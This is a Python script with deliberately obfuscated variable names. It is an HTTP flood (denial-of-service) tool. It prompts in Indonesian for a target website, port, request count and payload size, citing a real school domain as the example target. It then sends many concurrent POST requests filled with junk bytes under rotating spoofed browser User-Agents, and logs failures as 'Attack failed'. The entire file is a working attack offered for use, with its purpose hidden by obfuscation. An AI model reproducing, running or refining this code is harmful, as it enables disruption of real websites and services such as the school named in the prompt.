lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll = Exception, range, __name__, input, int

from logging import INFO as lIlIIllIlIlIll, info as IIllIllIIIlllI, basicConfig as IIIlIllIlIllIl, error as llIlIIIlllllII
from random import choice as llIlIIIIIlIIII
from aiohttp import ClientSession as llIIlIllIlllIl
from asyncio import run as lIlIlllIIlIIII, gather as llllIIllIIIlIl
from socket import gethostbyname as llIIIIIlllllIl, gaierror as llIlllIllllIlI
IIIlIllIlIllIl(level=lIlIIllIlIlIll, format='%(asctime)s - %(levelname)s - %(message)s')
IIlIIlIllIIllIllII = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36']
lIlIIIIllIlIIlllII = 3

async def IllIIIIIIlIllIIlII(IIIIlIIIIlIIlIlIIl, IIllIlIllllIlIIIll, IlIlIlllIlIllIIlIl):
    lIlIlIlIIIlIIIIlIl = {'User-Agent': llIlIIIIIlIIII(IIlIIlIllIIllIllII)}
    try:
        async with IIIIlIIIIlIIlIlIIl.post(IIllIlIllllIlIIIll, headers=lIlIlIlIIIlIIIIlIl, data='A' * IlIlIlllIlIllIIlIl) as response:
            if response.status == 200:
                IIllIllIIIlllI(f'Request to {IIllIlIllllIlIIIll} successful')
            else:
                llIlIIIlllllII(f'Request to {IIllIlIllllIlIIIll} failed with status {response.status}')
    except lllllllllllllll as lIIlIIlIIIIIIIIIII:
        llIlIIIlllllII(f'Error sending request to {IIllIlIllllIlIIIll}: {lIIlIIlIIIIIIIIIII}')

async def IIlIlIlllIlllIIIlI(IIllIlIllllIlIIIll, IIIllllIIIIllIlIll, IlIlIlllIlIllIIlIl):
    async with llIIlIllIlllIl() as IIIIlIIIIlIIlIlIIl:
        llIIlIIIlIIllIlIII = []
        for IIlIlllIIIllIIlIll in llllllllllllllI(IIIllllIIIIllIlIll):
            llIIlIIIlIIllIlIII.append(IllIIIIIIlIllIIlII(IIIIlIIIIlIIlIlIIl, IIllIlIllllIlIIIll, IlIlIlllIlIllIIlIl))
        await llllIIllIIIlIl(*llIIlIIIlIIllIlIII)

def lIIIlllIIlIlIIlIlI(IIllIlIllllIlIIIll, IIIllllIIIIllIlIll, IlIlIlllIlIllIIlIl):
    try:
        lIlIlllIIlIIII(IIlIlIlllIlllIIIlI(IIllIlIllllIlIIIll, IIIllllIIIIllIlIll, IlIlIlllIlIllIIlIl))
    except lllllllllllllll as lIIlIIlIIIIIIIIIII:
        llIlIIIlllllII(f'Attack failed: {lIIlIIlIIIIIIIIIII}')

def IllIlIIIIIIIlIlIlI(IIllIlIllllIlIIIll):
    try:
        lIlIllllIIlIIIllIl = llIIIIIlllllIl(IIllIlIllllIlIIIll)
        return lIlIllllIIlIIIllIl
    except llIlllIllllIlI:
        llIlIIIlllllII(f'Failed to resolve IP for {IIllIlIllllIlIIIll}')
        return None

def IllIIIlIIllIlIIlIl():
    IIllIlIllllIlIIIll = lllllllllllllII('Masukkan URL yang ingin diuji (contoh: smkn2kotajambi.sch.id): ')
    lIIIIllIlIllIlIllI = lllllllllllllII('Masukkan port yang digunakan oleh website (contoh: 443 untuk HTTPS atau 80 untuk HTTP): ')
    IIIllllIIIIllIlIll = llllllllllllIll(lllllllllllllII('Masukkan jumlah request per bot: '))
    IlIlIlllIlIllIIlIl = llllllllllllIll(lllllllllllllII('Masukkan ukuran payload per request (dalam byte): '))
    lIlIllllIIlIIIllIl = IllIlIIIIIIIlIlIlI(IIllIlIllllIlIIIll)
    if lIlIllllIIlIIIllIl:
        IIlIIIlllIIlIIIIll = f'{lIlIllllIIlIIIllIl}:{lIIIIllIlIllIlIllI}'
        IIllIllIIIlllI(f'Target: {IIlIIIlllIIlIIIIll}')
        lIIIlllIIlIlIIlIlI(f'http://{IIlIIIlllIIlIIIIll}', IIIllllIIIIllIlIll, IlIlIlllIlIllIIlIl)
    else:
        llIlIIIlllllII('URL tidak valid atau gagal mendapatkan IP')
if lllllllllllllIl == '__main__':
    IllIIIlIIllIlIIlIl()